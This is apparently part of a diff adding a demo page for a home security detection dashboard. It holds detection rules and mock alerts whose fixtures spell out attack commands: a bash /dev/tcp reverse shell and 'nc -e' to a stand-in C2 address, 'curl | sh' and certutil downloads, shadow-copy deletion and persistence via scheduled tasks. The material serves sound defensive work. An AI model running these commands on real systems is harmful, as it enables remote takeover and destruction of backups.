\u2014 anti-forensic defense evasion.", "references": [], "match": [{"field": "process.cmdline", "op": "regex", "values": ["unset\\s+HISTFILE", "export\\s+HISTFILE=/dev/null", ">\\s*~?/?\\.bash_history"]}]}, {"id": "lin-shm-exec", "title": "Execution from shared memory", "severity": "high", "category": "process", "platform": ["linux"], "mitre": ["T1620", "T1036"], "description": "Binary executed from /dev/shm (or /run/shm). Almost never legitimate; common fileless-staging path. (/tmp execution was deliberately excluded \u2014 too many benign installers run from /tmp to alert on cleanly.)\n", "references": [], "match": [{"field": "process.exe", "op": "regex", "values": ["^/dev/shm/", "^/run/shm/"]}]}, {"id": "mac-curl-pipe-shell", "title": "Remote script piped to a shell", "severity": "high", "category": "process", "platform": ["darwin"], "mitre": ["T1059.004", "T1105"], "description": "curl/wget piped to sh/bash/zsh \u2014 drive-by install.", "references": [], "match": [{"field": "process.cmdline", "op": "regex", "values": ["(curl|wget)\\b[^|]*\\|\\s*(sudo\\s+)?(ba|z)?sh\\b"]}]}, {"id": "mac-osascript-shell", "title": "osascript running a shell command", "severity": "medium", "category": "process", "platform": ["darwin"], "mitre": ["T1059.002"], "description": "AppleScript \"do shell script\" \u2014 scripting-based execution. The bare \"-e\" match was dropped; osascript -e is common in legitimate automation.\n", "references": [], "match": [{"field": "process.name", "op": "equals", "value": "osascript"}, {"field": "process.cmdline", "op": "regex", "values": ["do\\s+shell\\s+script"]}]}, {"id": "mac-launch-persistence", "title": "LaunchAgent / LaunchDaemon plist written", "severity": "medium", "category": "file", "platform": ["darwin"], "mitre": ["T1543.001", "T1543.004"], "description": "New/modified plist under LaunchAgents or LaunchDaemons \u2014 persistence.", "references": [], "match": [{"field": "file.path", "op": "regex", "values": ["/Library/LaunchAgents/", "/Library/LaunchDaemons/"]}, {"field": "action", "op": "in", "values": ["create", "modify", "move"]}]}, {"id": "mac-gatekeeper-disable", "title": "Gatekeeper assessment disabled", "severity": "high", "category": "process", "platform": ["darwin"], "mitre": ["T1553.001"], "description": "spctl --master-disable turns off Gatekeeper \u2014 defense evasion.", "references": [], "match": [{"field": "process.cmdline", "op": "regex", "values": ["spctl\\s+--master-disable"]}]}, {"id": "mac-tcc-db-access", "title": "Direct access to TCC privacy database", "severity": "high", "category": "process", "platform": ["darwin"], "mitre": ["T1548"], "description": "sqlite3 reading/writing TCC.db, or tccutil reset \u2014 privacy/permissions tampering.", "references": [], "match": [{"field": "process.cmdline", "op": "regex", "values": ["TCC\\.db", "tccutil\\s+reset"]}]}, {"id": "mac-dscl-user-add", "title": "Local account created via dscl", "severity": "medium", "category": "process", "platform": ["darwin"], "mitre": ["T1136.001"], "description": "dscl . -create on /Users \u2014 local account creation/persistence.", "references": [], "match": [{"field": "process.name", "op": "equals", "value": "dscl"}, {"field": "process.cmdline", "op": "regex", "values": ["-create\\s+/Users/"]}]}, {"id": "net-shell-egress", "title": "Interpreter/LOLBIN making external connection", "severity": "high", "category": "network", "platform": [], "mitre": ["T1071", "T1059"], "description": "A shell or known LOLBIN holding an established connection to a public IP \u2014 likely C2 or staging. General interpreters (python/perl/ruby) were dropped from this list: their outbound traffic is overwhelmingly benign in a dev/home environment and was the single biggest false-positive source.\n", "references": [], "match": [{"field": "network.process_name", "op": "in", "values": ["bash", "sh", "zsh", "dash", "nc", "ncat", "netcat", "powershell.exe", "pwsh.exe", "cmd.exe", "certutil.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe", "bitsadmin.exe"]}, {"field": "network.raddr", "op": "ip_public"}, {"field": "network.status", "op": "in", "values": ["ESTABLISHED", "SYN_SENT"]}]}, {"id": "net-blocklist-ip", "title": "Connection to known-bad IP (blocklist)", "severity": "critical", "category": "network", "platform": [], "mitre": ["T1071"], "description": "Outbound connection to an operator-supplied blocklist. Ships empty so it never fires by default; add your own indicators (CIDRs accepted) to light it up. This is the highest-fidelity network rule \u2014 it only matches IPs you assert.\n", "references": [], "match": [{"field": "network.raddr", "op": "ip_in", "values": []}]}, {"id": "auth-ssh-external-root", "title": "Successful external SSH login as a privileged account", "severity": "high", "category": "auth", "platform": [], "mitre": ["T1078", "T1021.004"], "description": "Interactive SSH success for root/admin from a public source IP. High-signal on its own; failures are not alerted (they need aggregation to be meaningful).\n", "references": [], "match": [{"field": "auth.method", "op": "equals", "value": "ssh"}, {"field": "auth.result", "op": "equals", "value": "success"}, {"field": "auth.user", "op": "in", "values": ["root", "admin", "administrator"]}, {"field": "auth.source_ip", "op": "ip_public"}]}, {"id": "win-powershell-encoded", "title": "PowerShell encoded command", "severity": "high", "category": "process", "platform": ["windows"], "mitre": ["T1059.001", "T1027"], "description": "powershell.exe launched with -EncodedCommand / -enc \u2014 common obfuscation.", "references": ["https://attack.mitre.org/techniques/T1059/001/"], "match": [{"field": "process.name", "op": "in", "values": ["powershell.exe", "pwsh.exe"]}, {"field": "process.cmdline", "op": "regex", "values": ["\\s-e(nc|ncodedcommand)?\\b\\s+[A-Za-z0-9+/=]{30,}"]}]}, {"id": "win-powershell-suspicious-loader", "title": "PowerShell hidden window with download/exec", "severity": "high", "category": "process", "platform": ["windows"], "mitre": ["T1059.001"], "description": "Hidden/no-profile PowerShell combined with a download or in-memory exec indicator. The bare \"-w hidden\" check was dropped on its own (installers use it); this requires the loader behaviour alongside it.\n", "references": [], "match": [{"field": "process.name", "op": "in", "values": ["powershell.exe", "pwsh.exe"]}, {"field": "process.cmdline", "op": "regex", "values": ["-w\\s+hidden", "-windowstyle\\s+hidden"]}, {"field": "process.cmdline", "op": "regex", "values": ["DownloadString", "DownloadFile", "Invoke-Expression", "\\bIEX\\b", "FromBase64String", "Net\\.WebClient", "Invoke-WebRequest", "https?://"]}]}, {"id": "win-certutil-download", "title": "certutil used to download a file", "severity": "high", "category": "process", "platform": ["windows"], "mitre": ["T1105", "T1218"], "description": "certutil -urlcache/-f used as a LOLBIN downloader.", "references": [], "match": [{"field": "process.name", "op": "equals", "value": "certutil.exe"}, {"field": "process.cmdline", "op": "regex", "values": ["-urlcache", "-f\\b.*http"]}]}, {"id": "win-mshta-remote", "title": "mshta executing remote content", "severity": "high", "category": "process", "platform": ["windows"], "mitre": ["T1218.005"], "description": "mshta.exe pointed at a URL or script \u2014 LOLBIN execution.", "references": [], "match": [{"field": "process.name", "op": "equals", "value": "mshta.exe"}, {"field": "process.cmdline", "op": "regex", "values": ["https?://", "javascript:", "vbscript:"]}]}, {"id": "win-rundll32-suspicious", "title": "rundll32 with URL or script reference", "severity": "medium", "category": "process", "platform": ["windows"], "mitre": ["T1218.011"], "description": "rundll32 invoking a URL or javascript \u2014 proxy execution.", "references": [], "match": [{"field": "process.name", "op": "equals", "value": "rundll32.exe"}, {"field": "process.cmdline", "op": "regex", "values": ["https?://", "javascript:", "mshtml"]}]}, {"id": "win-bitsadmin-transfer", "title": "bitsadmin file transfer", "severity": "high", "category": "process", "platform": ["windows"], "mitre": ["T1197", "T1105"], "description": "bitsadmin /transfer used to stage payloads.", "references": [], "match": [{"field": "process.name", "op": "equals", "value": "bitsadmin.exe"}, {"field": "process.cmdline", "op": "contains", "value": "/transfer"}]}, {"id": "win-wmic-process-create", "title": "wmic process call create", "severity": "medium", "category": "process", "platform": ["windows"], "mitre": ["T1047"], "description": "wmic spawning a process \u2014 lateral/defense-evasion LOLBIN.", "references": [], "match": [{"field": "process.name", "op": "equals", "value": "wmic.exe"}, {"field": "process.cmdline", "op": "regex", "values": ["process\\s+call\\s+create"]}]}, {"id": "win-vssadmin-delete-shadows", "title": "Volume shadow copies deleted", "severity": "critical", "category": "process", "platform": ["windows"], "mitre": ["T1490"], "description": "vssadmin/wmic deleting shadow copies \u2014 common pre-ransomware step.", "references": [], "match": [{"field": "process.cmdline", "op": "regex", "values": ["vssadmin\\s+delete\\s+shadows", "shadowcopy\\s+delete", "wbadmin\\s+delete\\s+catalog"]}]}, {"id": "win-schtasks-suspicious", "title": "Scheduled task running a suspicious payload", "severity": "medium", "category": "process", "platform": ["windows"], "mitre": ["T1053.005"], "description": "schtasks /create whose action is an interpreter, LOLBIN, web URL, or a binary under temp/appdata. Plain /create was dropped \u2014 software updaters register tasks constantly; this requires the payload to look like tooling.\n", "references": [], "match": [{"field": "process.name", "op": "equals", "value": "schtasks.exe"}, {"field": "process.cmdline", "op": "contains", "value": "/create"}, {"field": "process.cmdline", "op": "regex", "values": ["powershell", "pwsh", "cmd\\s+/c", "-e(nc|ncodedcommand)?\\b", "mshta", "rundll32", "regsvr32", "bitsadmin", "certutil", "https?://", "%temp%", "%appdata%", "\\\\temp\\\\", "\\\\appdata\\\\", "\\.ps1", "\\.vbs", "\\.js\\b"]}]}, {"id": "win-recon-domain", "title": "Domain/privilege reconnaissance", "severity": "low", "category": "process", "platform": ["windows"], "mitre": ["T1033", "T1087", "T1018"], "description": "High-signal discovery only \u2014 domain-controller listing, Domain Admins enumeration, or whoami /all|/priv. Bare \"whoami\" and \"net user\" were dropped; they fire on routine admin and login scripts.\n", "references": [], "match": [{"field": "process.cmdline", "op": "regex", "values": ["nltest\\s+/dclist", "net\\s+group\\s+\"?domain admins", "net\\s+group\\s+.*/domain", "whoami\\s+/all", "whoami\\s+/priv"]}]}];
+</script>
+  <script>
+// Seeded demo data + in-memory API stub for the HomeSOC dashboard preview.
+// In-memory fixtures + a fetch-less API stub. Every call resolves from the data
+// real render code in app.js runs unmodified against realistic data.
+
+const T = () => Math.floor(Date.now() / 1000);
+const mago = (m) => T() - m * 60;
+
+const MOCK = {
+  settings: { claude_enabled: true, claude_model: "claude-sonnet-4-6",
+              claude_token_set: true, claude_token_masked: "sk-…a1f9" },
+  devices: [
+    { device_id: "d1", hostname: "ubuntu-web-01", platform: "linux",   ip: "10.20.4.11", last_seen: T() - 8,    online: true },
+    { device_id: "d2", hostname: "DESKTOP-7F2A1", platform: "windows", ip: "10.20.4.52", last_seen: T() - 15,   online: true },
+    { device_id: "d3", hostname: "mbp-mthomas",   platform: "darwin",  ip: "10.20.4.77", last_seen: T() - 26,   online: true },
+    { device_id: "d4", hostname: "win-srv-dc1",   platform: "windows", ip: "10.20.4.10", last_seen: T() - 11,   online: true },
+    { device_id: "d5", hostname: "jenkins-ci",    platform: "linux",   ip: "10.20.4.30", last_seen: T() - 10800, online: false },
+  ],
+  alerts: [],
+};
+
+const C2 = "39.107.60.51";
+
+function ev(base, extra) { return Object.assign({ ts: base }, extra); }
+
+MOCK.alerts = [
+  {
+    id: "a1", ts: mago(2), rule_id: "lin-reverse-shell-devtcp",
+    title: "Bash /dev/tcp reverse shell", severity: "critical",
+    category: "process", mitre: ["T1059.004", "T1071.001"],
+    device_id: "d1", hostname: "ubuntu-web-01", status: "new",
+    event: ev(mago(2), {
+      device_id: "d1", hostname: "ubuntu-web-01", platform: "linux",
+      category: "process", action: "exec",
+      process: { pid: 48213, ppid: 48190, name: "bash", exe: "/bin/bash",
+        cmdline: "bash -i >& /dev/tcp/" + C2 + "/4444 0>&1",
+        username: "www-data", parent_name: "python3" },
+    }),
+    story: {
+      rule: {
+        description: "Interactive bash redirected to a /dev/tcp socket — classic reverse shell.",
+        match: [{ field: "process.cmdline", op: "regex", values: ["/dev/(tcp|udp)/", "bash\\s+-i"] }],
+        references: ["https://attack.mitre.org/techniques/T1059/004/"],
+      },
+      process_tree: [
+        { depth: 0, pid: 1188,  ppid: 1,     process_name: "nginx",   cmdline: "nginx: worker process", is_trigger: false },
+        { depth: 1, pid: 48150, ppid: 1188,  process_name: "sh",      cmdline: "sh -c curl -s http://" + C2 + "/p.sh | sh", is_trigger: false },
+        { depth: 2, pid: 48190, ppid: 48150, process_name: "python3", cmdline: "python3 -c \"import urllib.request,os;urllib.request.urlretrieve('http://" + C2 + "/stage2','/tmp/.s')\"", is_trigger: false },
+        { depth: 3, pid: 48213, ppid: 48190, process_name: "bash",    cmdline: "bash -i >& /dev/tcp/" + C2 + "/4444 0>&1", is_trigger: true },
+        { depth: 4, pid: 48230, ppid: 48213, process_name: "nc",      cmdline: "nc -e /bin/sh " + C2 + " 4444", is_trigger: false },
+      ],
+      timeline: [
+        { category: "auth",    action: "login",  ts: mago(6), summary: "success ssh user=deploy from=10.20.4.5" },
+        { category: "process", action: "exec",   ts: mago(3), summary: "curl :: curl -s http://" + C2 + "/p.sh" },
+        { category: "file",    action: "create", ts: mago(3), summary: "create /tmp/p.sh" },
+        { category: "network", action: "connect",ts: mago(3), summary: "python3 -> " + C2 + ":80 tcp ESTABLISHED" },
+        { category: "process", action: "exec",   ts: mago(2), summary: "bash :: bash -i >& /dev/tcp/" + C2 + "/4444 0>&1", is_trigger: true },
+        { category: "network", action: "connect",ts: mago(2), summary: "bash -> " + C2 + ":4444 tcp ESTABLISHED" },
+        { category: "process", action: "exec",   ts: mago(1), summary: "nc :: nc -e /bin/sh " + C2 + " 4444" },
+      ],
+      behavioral:
+"Assessment\nHigh-confidence interactive reverse shell from the web-server service account (www-data) to an external host. Pattern is consistent with successful exploitation of the public-facing nginx workload followed by second-stage retrieval and an outbound C2 session.\n\nConfirmed facts\n- www-data executed `bash -i` redirected to /dev/tcp/" + C2 + "/4444 (pid 48213, parent python3 48190).\n- An ESTABLISHED TCP session from python3 (48190) to " + C2 + ":80 precedes the exec; a second session to :4444 coincides with it.\n- The lineage originates under nginx worker 1188 via `sh -c curl … | sh`.\n- /tmp/p.sh was created ~40s before the bash exec; a child `nc -e /bin/sh` followed.\n\nInference / hypotheses\n- The curl|sh + python3 stages indicate a downloader pulling tooling from the same IP before the shell.\n- " + C2 + ":4444 is the likely interactive C2 listener; :80 the staging channel.\n\nBenign explanations\n- Low likelihood. A scripted admin task could match curl|sh, but an interactive bash to /dev/tcp under www-data is not normal for a service account that should not have a shell.\n\nSuggested next steps\n- Capture the live socket and process before they exit: `ss -tnp`, `/proc/48213/{cmdline,exe,fd}`; preserve /tmp/p.sh and the python3 args.\n- Pull nginx access/error logs around T-2m for the initiating request.\n- Sweep egress for other hosts beaconing to " + C2 + " and block at the perimeter.\n- Review www-data recent file writes and crontab.\n\nConfidence: High — process lineage, two network sessions, and a dropped file independently converge on the same external IP within a tight window.",
+    },
+  },
+  {
+    id: "a2", ts: mago(9), rule_id: "win-vssadmin-delete-shadows",
+    title: "Volume shadow copies deleted", severity: "critical",
+    category: "process", mitre: ["T1490"],
+    device_id: "d4", hostname: "win-srv-dc1", status: "new",
+    event: ev(mago(9), {
+      device_id: "d4", hostname: "win-srv-dc1", platform: "windows",
+      category: "process", action: "exec",
+      process: { pid: 6620, ppid: 6440, name: "vssadmin.exe",
+        exe: "C:\\Windows\\System32\\vssadmin.exe",
+        cmdline: "vssadmin delete shadows /all /quiet",
+        username: "NT AUTHORITY\\SYSTEM", parent_name: "cmd.exe" },
+    }),
+    story: {
+      rule: {
+        description: "vssadmin/wmic deleting shadow copies — common pre-ransomware step.",
+        match: [{ field: "process.cmdline", op: "regex", values: ["vssadmin\\s+delete\\s+shadows", "shadowcopy\\s+delete", "wbadmin\\s+delete\\s+catalog"] }],
+        references: ["https://attack.mitre.org/techniques/T1490/"],
+      },
+      process_tree: [
+        { depth: 0, pid: 6210, ppid: 1, process_name: "powershell.exe", cmdline: "powershell -nop -w hidden -enc UwB0AG8AcAAtAFMAZQByAHYAaQBjAGUA...", is_trigger: false },
+        { depth: 1, pid: 6440, ppid: 6210, process_name: "cmd.exe", cmdline: "cmd /c vssadmin delete shadows /all /quiet & wbadmin delete catalog -quiet", is_trigger: false },
+        { depth: 2, pid: 6620, ppid: 6440, process_name: "vssadmin.exe", cmdline: "vssadmin delete shadows /all /quiet", is_trigger: true },
+      ],
+      timeline: [
+        { category: "process", action: "exec", ts: mago(11), summary: "powershell.exe :: -nop -w hidden -enc UwB0AG8A…" },
+        { category: "process", action: "exec", ts: mago(9), summary: "cmd.exe :: cmd /c vssadmin delete shadows /all /quiet" },
+        { category: "process", action: "exec", ts: mago(9), summary: "vssadmin.exe :: vssadmin delete shadows /all /quiet", is_trigger: true },
+        { category: "process", action: "exec", ts: mago(8), summary: "wbadmin.exe :: wbadmin delete catalog -quiet" },
+      ],
+    },
+  },
+  {
+    id: "a3", ts: mago(22), rule_id: "win-powershell-encoded",
+    title: "PowerShell encoded command", severity: "high",
+    category: "process", mitre: ["T1059.001", "T1027"],
+    device_id: "d2", hostname: "DESKTOP-7F2A1", status: "investigating",
+    event: ev(mago(22), {
+      device_id: "d2", hostname: "DESKTOP-7F2A1", platform: "windows",
+      category: "process", action: "exec",
+      process: { pid: 9120, ppid: 8804, name: "powershell.exe",
+        exe: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        cmdline: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+        username: "CORP\\m.thomas", parent_name: "WINWORD.EXE" },
+    }),
+    story: {
+      rule: {
+        description: "powershell.exe launched with -EncodedCommand / -enc — common obfuscation.",
+        match: [
+          { field: "process.name", op: "in", values: ["powershell.exe", "pwsh.exe"] },
+          { field: "process.cmdline", op: "regex", values: ["\\s-e(nc|ncodedcommand)?\\b\\s+[A-Za-z0-9+/=]{30,}"] },
+        ],
+        references: ["https://attack.mitre.org/techniques/T1059/001/"],
+      },
+      process_tree: [
+        { depth: 0, pid: 7400, ppid: 1, process_name: "explorer.exe", cmdline: "C:\\Windows\\explorer.exe", is_trigger: false },
+        { depth: 1, pid: 8804, ppid: 7400, process_name: "WINWORD.EXE", cmdline: "\"WINWORD.EXE\" /n C:\\Users\\m.thomas\\Downloads\\invoice_0624.docm", is_trigger: false },
+        { depth: 2, pid: 9120, ppid: 8804, process_name: "powershell.exe", cmdline: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA…", is_trigger: true },
+      ],
+      timeline: [
+        { category: "file",    action: "create", ts: mago(24), summary: "create C:\\Users\\m.thomas\\Downloads\\invoice_0624.docm" },
+        { category: "process", action: "exec",   ts: mago(23), summary: "WINWORD.EXE :: /n …\\invoice_0624.docm" },
+        { category: "process", action: "exec",   ts: mago(22), summary: "powershell.exe :: -nop -w hidden -enc SQBFAFgA…", is_trigger: true },
+        { category: "network", action: "connect",ts: mago(22), summary: "powershell.exe -> " + C2 + ":443 tcp ESTABLISHED" },
+      ],
+    },
+  },
+  {
+    id: "a4", ts: mago(2), rule_id: "net-shell-egress",
+    title: "Interpreter making external connection", severity: "high",
+    category: "network", mitre: ["T1071", "T1059"],
+    device_id: "d1", hostname: "ubuntu-web-01", status: "new",
+    event: ev(mago(2), {
+      device_id: "d1", hostname: "ubuntu-web-01", platform: "linux",
+      category: "network", action: "connect",
+      network: { laddr: "10.20.4.11", lport: 51544, raddr: C2, rport: 80,
+        proto: "tcp", status: "ESTABLISHED", pid: 48190, process_name: "python3" },
+    }),
+    story: {
+      rule: {
+        description: "A shell/interpreter process connecting to a public IP — possible C2/egress.",
+        match: [
+          { field: "network.process_name", op: "in", values: ["bash", "sh", "python", "python3", "powershell.exe", "cmd.exe", "nc"] },
+          { field: "network.raddr", op: "ip_public" },
+        ],
+        references: [],
+      },
+      process_tree: [
+        { depth: 0, pid: 48150, ppid: 1188,  process_name: "sh",      cmdline: "sh -c curl -s http://" + C2 + "/p.sh | sh", is_trigger: false },
+        { depth: 1, pid: 48190, ppid: 48150, process_name: "python3", cmdline: "python3 -c \"import urllib.request…\"", is_trigger: true },
+      ],
+      timeline: [
+        { category: "process", action: "exec",   ts: mago(3), summary: "python3 :: import urllib.request…" },
+        { category: "network", action: "connect",ts: mago(2), summary: "python3 -> " + C2 + ":80 tcp ESTABLISHED", is_trigger: true },
+        { category: "network", action: "connect",ts: mago(2), summary: "bash -> " + C2 + ":4444 tcp ESTABLISHED" },
+      ],
+    },
+  },
+  {
+    id: "a5", ts: mago(35), rule_id: "win-certutil-download",
+    title: "certutil used to download a file", severity: "high",
+    category: "process", mitre: ["T1105", "T1218"],
+    device_id: "d2", hostname: "DESKTOP-7F2A1", status: "new",
+    event: ev(mago(35), {
+      device_id: "d2", hostname: "DESKTOP-7F2A1", platform: "windows",
+      category: "process", action: "exec",
+      process: { pid: 9540, ppid: 9120, name: "certutil.exe",
+        exe: "C:\\Windows\\System32\\certutil.exe",
+        cmdline: "certutil.exe -urlcache -split -f http://" + C2 + "/a.exe C:\\Users\\Public\\a.exe",
+        username: "CORP\\m.thomas", parent_name: "powershell.exe" },
+    }),
+    story: {
+      rule: {
+        description: "certutil -urlcache/-f used as a LOLBIN downloader.",
+        match: [
+          { field: "process.name", op: "equals", value: "certutil.exe" },
+          { field: "process.cmdline", op: "regex", values: ["-urlcache", "-f\\b.*http"] },
+        ],
+        references: ["https://attack.mitre.org/techniques/T1105/"],
+      },
+      process_tree: [
+        { depth: 0, pid: 8804, ppid: 7400, process_name: "WINWORD.EXE", cmdline: "\"WINWORD.EXE\" /n …invoice_0624.docm", is_trigger: false },
+        { depth: 1, pid: 9120, ppid: 8804, process_name: "powershell.exe", cmdline: "powershell.exe -nop -w hidden -enc …", is_trigger: false },
+        { depth: 2, pid: 9540, ppid: 9120, process_name: "certutil.exe", cmdline: "certutil.exe -urlcache -split -f http://" + C2 + "/a.exe C:\\Users\\Public\\a.exe", is_trigger: true },
+      ],
+      timeline: [
+        { category: "process", action: "exec",   ts: mago(36), summary: "powershell.exe :: -nop -w hidden -enc …" },
+        { category: "process", action: "exec",   ts: mago(35), summary: "certutil.exe :: -urlcache -split -f http://" + C2 + "/a.exe", is_trigger: true },
+        { category: "file",    action: "create", ts: mago(35), summary: "create C:\\Users\\Public\\a.exe" },
+      ],
+    },
+  },
+  {
+    id: "a6", ts: mago(50), rule_id: "mac-launch-persistence",
+    title: "LaunchAgent / LaunchDaemon plist written", severity: "medium",
+    category: "file", mitre: ["T1543.001"],
+    device_id: "d3", hostname: "mbp-mthomas", status: "new",
+    event: ev(mago(50), {
+      device_id: "d3", hostname: "mbp-mthomas", platform: "darwin",
+      category: "file", action: "create",
+      file: { path: "/Users/mthomas/Library/LaunchAgents/com.apple.softwareupdated.plist",
+              name: "com.apple.softwareupdated.plist" },
+    }),
+    story: {
+      rule: {
+        description: "New/modified plist under LaunchAgents or LaunchDaemons — persistence.",
+        match: [
+          { field: "file.path", op: "regex", values: ["/Library/LaunchAgents/", "/Library/LaunchDaemons/"] },
+          { field: "action", op: "in", values: ["create", "modify", "move"] },
+        ],
+        references: ["https://attack.mitre.org/techniques/T1543/001/"],
+      },
+      process_tree: [],
+      timeline: [
+        { category: "process", action: "exec",   ts: mago(51), summary: "curl :: curl -fsSL http://" + C2 + "/upd -o /tmp/.upd" },
+        { category: "file",    action: "create", ts: mago(50), summary: "create …/LaunchAgents/com.apple.softwareupdated.plist", is_trigger: true },
+        { category: "process", action: "exec",   ts: mago(49), summary: "launchctl :: launchctl load -w …softwareupdated.plist" },
+      ],
+    },
+  },
+  {
+    id: "a8", ts: mago(80), rule_id: "win-recon-domain",
+    title: "Domain/privilege reconnaissance", severity: "low",
+    category: "process", mitre: ["T1033", "T1087", "T1018"],
+    device_id: "d2", hostname: "DESKTOP-7F2A1", status: "new",
+    event: ev(mago(80), {
+      device_id: "d2", hostname: "DESKTOP-7F2A1", platform: "windows",
+      category: "process", action: "exec",
+      process: { pid: 9980, ppid: 9120, name: "cmd.exe", exe: "C:\\Windows\\System32\\cmd.exe",
+        cmdline: "cmd.exe /c whoami /all & net user & net group \"Domain Admins\" /domain",
+        username: "CORP\\m.thomas", parent_name: "powershell.exe" },
+    }),
+    story: {
+      rule: {
+        description: "High-signal discovery: DC listing, Domain Admins enumeration, or whoami /all|/priv.",
+        match: [{ field: "process.cmdline", op: "regex", values: ["nltest\\s+/dclist", "net\\s+group\\s+\"?domain admins", "net\\s+group\\s+.*/domain", "whoami\\s+/all", "whoami\\s+/priv"] }],
+        references: [],
+      },
+      process_tree: [
+        { depth: 0, pid: 9120, ppid: 8804, process_name: "powershell.exe", cmdline: "powershell.exe -nop -w hidden -enc …", is_trigger: false },
+        { depth: 1, pid: 9980, ppid: 9120, process_name: "cmd.exe", cmdline: "cmd.exe /c whoami /all & net user & net group \"Domain Admins\" /domain", is_trigger: true },
+      ],
+      timeline: [
+        { category: "process", action: "exec", ts: mago(80), summary: "cmd.exe :: whoami /all & net user & net group …", is_trigger: true },
+      ],
+    },
+  },
+  {
+    id: "a10", ts: mago(180), rule_id: "win-schtasks-suspicious",
+    title: "Scheduled task running a suspicious payload", severity: "medium",
+    category: "process", mitre: ["T1053.005"],
+    device_id: "d4", hostname: "win-srv-dc1", status: "new",
+    event: ev(mago(180), {
+      device_id: "d4", hostname: "win-srv-dc1", platform: "windows",
+      category: "process", action: "exec",
+      process: { pid: 7010, ppid: 6440, name: "schtasks.exe", exe: "C:\\Windows\\System32\\schtasks.exe",
+        cmdline: "schtasks /create /tn \"Updater\" /tr \"powershell -nop -w hidden -enc …\" /sc minute /mo 5 /ru SYSTEM",
+        username: "NT AUTHORITY\\SYSTEM", parent_name: "cmd.exe" },
+    }),
+    story: {
+      rule: {
+        description: "schtasks /create whose action is an interpreter/LOLBIN/URL or a temp-path binary.",
+        match: [
+          { field: "process.name", op: "equals", value: "schtasks.exe" },
+          { field: "process.cmdline", op: "contains", value: "/create" },
+          { field: "process.cmdline", op: "regex", values: ["powershell", "cmd\\s+/c", "-e(nc|ncodedcommand)?\\b", "https?://", "%temp%", "%appdata%"] },
+        ],
+        references: ["https://attack.mitre.org/techniques/T1053/005/"],
+      },
+      process_tree: [
+        { depth: 0, pid: 6440, ppid: 6210, process_name: "cmd.exe", cmdline: "cmd /c schtasks /create …", is_trigger: false },
+        { depth: 1, pid: 7010, ppid: 6440, process_name: "schtasks.exe", cmdline: "schtasks /create /tn \"Updater\" /tr \"powershell …\" /sc minute /mo 5 /ru SYSTEM", is_trigger: true },
+      ],
+      timeline: [
+        { category: "process", action: "exec", ts: mago(180), summary: "schtasks.exe :: /create /tn Updater /sc minute /mo 5", is_trigger: true },
+      ],
+    },
+  },
+];
+
+function _iso(ts) {
+  return new Date(ts * 1000).toISOString().replace(/\.\d+Z$/, "Z");
+}
+
+function _counts() {
+  const c = {};
+  for (const a of MOCK.alerts) if (a.status !== "resolved") c[a.severity] = (c[a.severity] || 0) + 1;
+  return c;
+}
+
+function _genAnalysis(a) {
+  const host = a.hostname, m = (a.mitre || []).join(", ") || "n/a";
+  return (
+"Assessment\nSignature `" + a.rule_id + "` fired on " + host + ". Treat as a lead to corroborate, not a verdict on its own.\n\n" +
+"Confirmed facts\n- " + a.title + " observed on " + host + " at " + _iso(a.ts) + ".\n- MITRE mapping: " + m + ".\n\n" +
+"Inference / hypotheses\n- The activity is consistent with the technique above, but intent is not established from this event alone.\n\n" +
+"Benign explanations\n- Could be administrative or tooling activity; validate the responsible account and parent process before escalating.\n\n" +
+"Suggested next steps\n- Pull the surrounding process/file/network/auth telemetry on " + host + " for the same window.\n- Confirm whether the parent process and user are expected on this host.\n\n" +
+"Confidence: Medium — single high-signal event; corroboration pending.");
+}
+
+// ---- rules: seeded built-ins (injected at build time) + in-memory custom ----
+const SEED_RULES = (window.__SEED_RULES || []).map((r) => Object.assign({ source: "builtin", enabled: true }, r));
+let CUSTOM_RULES = [
+  { source: "custom", enabled: true, id: "custom-aws-key-in-cmdline",
+    title: "AWS access key id on a command line", severity: "high", category: "process",
+    platform: [], mitre: ["T1552.001"],
+    description: "Hardcoded AKIA… credential passed as a process argument.", references: [],
+    match: [{ field: "process.cmdline", op: "regex", values: ["AKIA[0-9A-Z]{16}"] }] },
+];
+function ruleListing() { return SEED_RULES.map((r) => ({ ...r })).concat(CUSTOM_RULES.map((r) => ({ ...r }))); }
+function activeRuleCount() { return SEED_RULES.length + CUSTOM_RULES.filter((r) => r.enabled).length; }
+
+// JS port of the server's operator set (so Validate / Test work offline)
+function _ip4(s) { const m = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(String(s || "")); if (!m) return null; const o = m.slice(1).map(Number); if (o.some((x) => x > 255)) return null; return ((o[0] << 24) >>> 0) + (o[1] << 16) + (o[2] << 8) + o[3]; }
+function _inR(n, a, b) { return n >= _ip4(a) && n <= _ip4(b); }
+function _isPriv(s) { const n = _ip4(s); if (n === null) return false; return _inR(n,"10.0.0.0","10.255.255.255")||_inR(n,"172.16.0.0","172.31.255.255")||_inR(n,"192.168.0.0","192.168.255.255")||_inR(n,"127.0.0.0","127.255.255.255")||_inR(n,"169.254.0.0","169.254.255.255"); }
+function _isPub(s) { const n = _ip4(s); if (n === null || _isPriv(s)) return false; if (_inR(n,"224.0.0.0","239.255.255.255")||_inR(n,"0.0.0.0","0.255.255.255")||_inR(n,"240.0.0.0","255.255.255.255")) return false; if (_inR(n,"192.0.2.0","192.0.2.255")||_inR(n,"198.51.100.0","198.51.100.255")||_inR(n,"203.0.113.0","203.0.113.255")) return false; return true; }
+function _inCidr(s, cidr) { const n = _ip4(s); if (n === null) return false; const [ip, bitsS] = String(cidr).split("/"); const base = _ip4(ip); if (base === null) return false; const bits = bitsS === undefined ? 32 : parseInt(bitsS, 10); const mask = bits === 0 ? 0 : (~0 << (32 - bits)) >>> 0; return ((n & mask) >>> 0) === ((base & mask) >>> 0); }
+function _nrm(v, cs) { const s = v == null ? "" : String(v); return cs ? s : s.toLowerCase(); }
+function _gf(ev, f) { let c = ev; for (const p of String(f).split(".")) { if (c && typeof c === "object") c = c[p]; else return undefined; } return c; }
+function evalCond(c, ev) {
+  const op = (c.op || "equals").toLowerCase(), cs = !!c.case_sensitive, actual = _gf(ev, c.field);
+  const vals = c.values || (c.value != null ? [c.value] : []);
+  if (op === "exists") return actual != null;
+  if (op === "not_exists") return actual == null;
